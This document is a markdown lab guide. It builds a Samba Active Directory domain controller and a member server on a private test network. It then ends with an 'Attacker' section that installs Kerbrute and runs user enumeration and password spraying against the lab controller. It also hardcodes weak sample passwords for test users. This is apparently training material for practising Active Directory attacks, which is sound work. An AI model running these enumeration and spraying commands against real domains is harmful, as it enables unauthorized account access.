# Samba

## Domain Controller

1. Set up the hostname:
	```bash
	hostnamectl set-hostname dc1
	```

2. Add the following line in the `/etc/hosts` file: 
		`192.168.122.10 dc1.polaris.org dc1`

3. Change to a static IP address in `/etc/netplan/50-cloud-init.yaml`:  
    ```
    addresses: [192.168.122.10/24]
    gateway4: 192.168.122.1
    nameservers:
    	addresses: [192.168.122.10, 8.8.8.8]
     ```
4. Save the changes:
    ```bash
    sudo netplan apply
    ```

5. Follow the installation from the Samba documentation:
     ```bash
    sudo -s
    wget https://download.samba.org/pub/samba/stable/samba-4.18.5.tar.gz
    tar xf samba-4.18.5.tar.gz
	cd samba-4.18.5/bootstrap/generated-dists/ubuntu1804
	./bootstrap.sh
	cd ../../..
	./configure
	make
	sudo make install
	/usr/local/samba/bin/samba-tool domain provision --use-rfc2307 --interactive
	```
	Add the lines to the `etc/resolv.conf` file:  
	
        search polaris.org
        nameserver 192.168.122.10
	  
	```bash
	systemctl disable --now systemd-resolved.service
	cp /usr/local/samba/private/krb5.conf /etc/krb5.conf
	# Start samba:
 	/usr/local/samba/sbin/samba
	```

6a. Add the lines to the `etc/resolv.conf`:
	```search polaris.org
	   nameserver 192.168.122.10```

6b. systemctl disable --now systemd-resolved.service

7. Start samba: `/usr/local/samba/sbin/samba`

8. Added aditional users to the domain:
   ```bash
	/usr/local/samba/bin/samba-tool user create Alice Alice1234
	/usr/local/samba/bin/samba-tool user create Bob Apolo1969
   ```

## Testing configuration

### Verifying the File Server
1.  `/usr/local/samba/bin/smbclient -L localhost -N`
2. `/usr/local/samba/bin/smbclient //localhost/netlogon -UAdministrator -c 'ls'`

### Verifying DNS

1. `host -t SRV _ldap._tcp.polaris.org.`
2. `host -t SRV _kerberos._udp.polaris.org.`
3. `host -t A dc1.polaris.org.`

### Verifying Kerberos

1. `kinit administrator`
2. `klist`

## Domain Member

1. Set the DNS server IP and AD DNS domain in the `/etc/resolv.conf`:

		nameserver 192.168.122.10
		search polaris.org
3. To configure Kerberos on the domain member, set the following in the `/etc/krb5.conf` file:

        [libdefaults]
            		default_realm = POLARIS.ORG
            		dns_lookup_realm = false
            		dns_lookup_kdc = true

4. Follow the installation from the Samba documentation:
     ```bash
	sudo -s
	wget https://download.samba.org/pub/samba/stable/samba-4.18.5.tar.gz
    tar xf samba-4.18.5.tar.gz
	cd samba-4.18.5/bootstrap/generated-dists/ubuntu1804
	./bootstrap.sh
	cd ../../..
	./configure
	make
	sudo make install
	 ```
5. Configuring the `autorid` Back End:

		[global]
		       security = ADS
		       workgroup = POLARIS
		       realm = POLARIS.ORG

		       log file = /var/log/samba/%m.log
		       log level = 1

		       template shell = /bin/bash
			   template homedir = /home/%U

		       # Default ID mapping configuration using the autorid
		       # idmap backend. This will work out of the box for simple setups
		       # as well as complex setups with trusted domains.
		       # NOTE: You cannot and must not use 'winbind use default domain = yes'
		       #       with the autorid idmap backend. This means that your users
		       #       will need to login using the format 'DOMAIN\username'.
		       #       If you want your users to login just using 'username' then
		       #       you cannot use the 'autorid' idmap backend.
		       idmap config * : backend = autorid
		       idmap config * : range = 10000-24999999

6. Reload the Samba configuration:

        /usr/local/samba/bin/smbcontrol all reload-config

7. Map the domain accounts to a local account to execute file operations on the domain member's file system as a different user than the account that requested the operation on the client:

    * Add the following parameter to the `[global]` section of your smb.conf file:
    
    		username map = /usr/local/samba/etc/user.map
    * Create the `/usr/local/samba/etc/user.map` file with the following content:
    
    		!root = POLARIS\Administrator

8. To join the host to an Active Directory (AD), enter:

		/usr/local/samba/bin/net ads join -U administrator

		OR

		/usr/local/samba/bin/samba-tool domain join samdom.example.com MEMBER -U administrator

9. Start the `smbd`, `nmbd` and `winbindd`  services to have a fully functioning Unix domain member:

    **[Note]:** If you do not require Network Browsing, you do not need to start the `nmbd` service on a Unix domain member.

   ```
        /usr/local/samba/sbin/smbd
   	/usr/local/samba/sbin/winbindd
	/usr/local/samba/sbin/nmbd
   ```
        
## Testing configuration

### Verifying DNS resolution

1. `nslookup dc1.polaris.org`
2. `host dc1.polaris.org`


### Resolving SRV Records
1.   
	    $ nslookup  
	    > set type=SRV  
	    > _ldap._tcp.polaris.org
    
2. `host -t SRV _ldap._tcp.polaris.org`


### Verifying the Winbindd Connectivity

1. `/usr/local/samba/bin/wbinfo --ping-dc`

## Attacker

### Requesites  installation

1. Install Kerbrute:

		wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64

2. Rename the the binary downloaded:

		mv kerbrute_linux_amd64 kerbrute

3. Give executable permissions to kerbrute:

		chmod +x kerbrute	


### User Enumeration
1. Enumerate the users in the Active Directory Domain Controller using a users list

        ./kerbrute userenum -d polaris.org users.txt --dc 192.168.122.10

### Password Spraying
1. Perform an horizontal brute force attack against a list of domain users. This is useful for testing one or two common passwords when you have a large list of users. 

        ./kerbrute passwordspray -d polaris.org valid_users.txt --dc 192.168.122.10 Passw0rd
